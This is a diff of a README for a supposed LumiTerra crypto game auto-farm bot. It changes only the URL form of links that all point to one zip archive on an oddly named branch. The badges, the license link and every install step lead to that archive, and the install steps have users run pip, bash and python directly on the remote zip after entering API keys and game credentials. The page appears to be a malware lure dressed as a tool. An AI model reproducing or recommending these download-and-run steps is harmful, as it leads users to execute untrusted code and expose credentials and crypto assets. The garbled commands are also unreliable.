@@ -1,6 +1,6 @@
 # LumiTerra Crypto Bot Crypto Game Auto Farm Clicker Token API 🌌
 
-![Download](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%20Crypto%20Bot-blue?logo=github&style=for-the-badge&https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip)
+![Download](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%20Crypto%20Bot-blue?logo=github&style=for-the-badge&https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip)
 
 <br/>
 
@@ -14,11 +14,11 @@ Let’s take your gameplay and crypto automation to a whole new planetary system
 
 | Platform      | Native Support | Emulator Support | Notes                |
 |:-------------:|:-------------:|:---------------:|:--------------------:|
-| ![Windows](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-blue?logo=windows) | ✅ Yes | ✔️  | Optimized experience |
-| ![Linux](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%20%2F%20Debian-yellow?logo=linux)    | ✅ Yes | ✔️  | Smooth performance   |
-| ![macOS](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-lightgrey?logo=apple)     | ✅ Yes | ✔️  | Native M-chip support|
-| ![Android](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-green?logo=android)   | 🚧 Beta | ✔️  | Coming soon         |
-| ![iOS](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-blueviolet?logo=apple)        | 🚧 Beta | ✔️  | For test devices    |
+| ![Windows](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-blue?logo=windows) | ✅ Yes | ✔️  | Optimized experience |
+| ![Linux](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%20%2F%20Debian-yellow?logo=linux)    | ✅ Yes | ✔️  | Smooth performance   |
+| ![macOS](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-lightgrey?logo=apple)     | ✅ Yes | ✔️  | Native M-chip support|
+| ![Android](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-green?logo=android)   | 🚧 Beta | ✔️  | Coming soon         |
+| ![iOS](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%2B-blueviolet?logo=apple)        | 🚧 Beta | ✔️  | For test devices    |
 
 *The above table features cosmic-tested platforms for smooth navigation through LumiTerra’s galaxy of automation tools.*
 
@@ -89,19 +89,19 @@ Whenever you hit an alien anomaly, our dedicated support team is here, burning t
 ## ⬇️ How to Board the LumiTerra Starship
 
 1. **Download the latest cosmic bundle:**
-    - Access the download portal here: https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip
+    - Access the download portal here: https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip
 2. **Unpack the launch sequence:**
-    - Open your terminal or file explorer and extract the `.zip` or `https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip` package.
+    - Open your terminal or file explorer and extract the `.zip` or `https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip` package.
 3. **Install the dependencies:**
-    - Windows: `pip install -r https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip` or use the provided installer.
-    - Linux/macOS: `bash https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip` or manually follow the docs in `/setup/`.
+    - Windows: `pip install -r https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip` or use the provided installer.
+    - Linux/macOS: `bash https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip` or manually follow the docs in `/setup/`.
 4. **Configure your quantum settings:**
     - Personalized config wizard helps you input API keys, in-game credentials, and languages.
 5. **Launch and explore:**
-    - Double-click the application or run `python https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip`.
+    - Double-click the application or run `python https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip`.
     - Consult the in-depth `/docs` folder for out-of-this-world recipes and advanced scripting.
 
-**Tip:** For API documentation and game-specific setup instructions, consult [`https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip`] for an interstellar voyage.
+**Tip:** For API documentation and game-specific setup instructions, consult [`https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip`] for an interstellar voyage.
 
 ---
 
@@ -113,11 +113,11 @@ LumiTerra is designed for **ethical automation and educational purposes only**. 
 
 ## 📜 License
 
-This project is released under the MIT License © 2025. Please review the [MIT license](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip) for terms and permissions.
+This project is released under the MIT License © 2025. Please review the [MIT license](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip) for terms and permissions.
 
 ---
 
-![Download](https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%20Crypto%20Bot-blue?logo=github&style=for-the-badge&https://github.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/raw/refs/heads/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip)
+![Download](https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip%20Crypto%20Bot-blue?logo=github&style=for-the-badge&https://raw.githubusercontent.com/arish16002/lumiterra-crypto-bot-autofarm-token-api-clicker/branch/hydrophobophobia/lumiterra-autofarm-token-clicker-api-bot-crypto-v3.8-alpha.2.zip)
 
 ---
 
